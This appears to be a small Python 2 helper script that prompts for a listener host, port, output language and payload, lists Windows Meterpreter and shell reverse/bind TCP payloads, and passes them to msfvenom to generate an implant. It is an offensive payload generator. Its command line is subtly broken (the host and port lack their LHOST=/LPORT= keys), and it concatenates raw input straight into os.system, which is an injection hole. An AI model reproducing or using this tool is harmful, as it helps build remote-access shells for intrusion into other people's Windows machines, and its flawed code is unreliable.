import os
#SET PATH
lhost = raw_input("SET LHOST:")
lport = raw_input("SET LPORT:")
name = raw_input("SET LANGUAGE: C PYTHON  ")
#IMPORTENT
print """
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
windows/x64/shell/reverse_tcp
windows/shell/reverse_tcp
windows/x64/shell_bind_tcp
windows/shell_bind_tcp
"""
payload = raw_input("SET PAYLOAD:")
os.system("Msfvenom -p "+ payload + " " + lhost + " " + lport + " -f " + name)
ok = raw_input()
